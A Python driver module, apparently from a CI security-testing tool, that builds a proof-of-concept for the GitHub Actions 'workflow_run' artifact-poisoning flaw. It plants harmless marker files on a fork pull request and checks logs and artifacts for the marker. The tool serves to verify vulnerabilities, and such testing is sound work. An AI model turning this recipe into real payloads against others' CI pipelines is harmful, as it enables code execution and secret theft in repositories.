"""Driver for `workflow_run-privileged`.

Two-stage: attacker opens a PR that triggers the mirror's `pull_request`
workflow, which uploads an artifact. The privileged `workflow_run` job
then consumes the artifact. We inject a marker into the artifact's
expected contents (via a benign file the upstream workflow packages).
"""
from __future__ import annotations

from ..attacker import PayloadFile
from .base import (
    Driver,
    DriverPreviewInfo,
    PayloadArtifact,
    SignalSpec,
    TriggerPlan,
    register,
)


class WorkflowRunPrivilegedDriver(Driver):
    category = "workflow_run-privileged"
    default_impact_tags = ["rce", "secrets_exposure"]

    def preview(self, finding: dict, marker: str) -> DriverPreviewInfo:
        signals = [
            SignalSpec(
                id="marker_in_log",
                signal_type="run_log_regex",
                tags=["rce"],
                description=f"privileged workflow_run log contains `GRAFTER_MARKER_{marker}`",
                params={"regex": f"GRAFTER_MARKER_{marker}"},
            ),
            SignalSpec(
                id="marker_in_artifact",
                signal_type="artifact_regex",
                tags=["rce"],
                description="an uploaded artifact contains the marker",
                params={"content_regex": f"GRAFTER_MARKER_{marker}"},
            ),
        ]
        return DriverPreviewInfo(
            claim=(
                "A fork PR uploads an artifact whose contents are attacker-"
                "controlled; the privileged `workflow_run` job consumes it "
                "and reaches an execution or env-write sink."
            ),
            impact_tags=list(self.default_impact_tags),
            signals=signals,
            success_requirement="marker_in_log OR marker_in_artifact",
            payload_summary=(
                "Plant marker-carrying files (`pr_number`, `pr.txt`, `env.txt`, "
                "`config.json`) on the attacker fork branch. Whichever file the "
                "upstream workflow packages ends up in the artifact the "
                "privileged workflow_run job consumes."
            ),
            supports_real_repo_mode=False,
        )

    def build_payload(self, finding: dict, marker: str) -> PayloadArtifact:
        marker_body = f"GRAFTER_MARKER_{marker}\n"
        files = [
            PayloadFile(path="pr_number", content=marker_body.encode("utf-8")),
            PayloadFile(path="pr.txt", content=marker_body.encode("utf-8")),
            PayloadFile(path="env.txt", content=marker_body.encode("utf-8")),
            PayloadFile(path="config.json", content=b'{"marker":"' + marker.encode() + b'"}\n'),
        ]
        return PayloadArtifact(files=files, commit_message=f"grafter-poc workflow_run {marker}")

    def build_trigger(self, finding: dict, marker: str) -> TriggerPlan:
        return TriggerPlan(
            kind="pr",
            branch=f"grafter-poc-{marker}",
            base_branch="main",
            title=f"Grafter Live PoC workflow_run {marker}",
            body="Grafter Live PoC — payload files carry the marker so the artifact contains it.",
            workflow_run_wait_after_pr=True,
        )


register(WorkflowRunPrivilegedDriver())
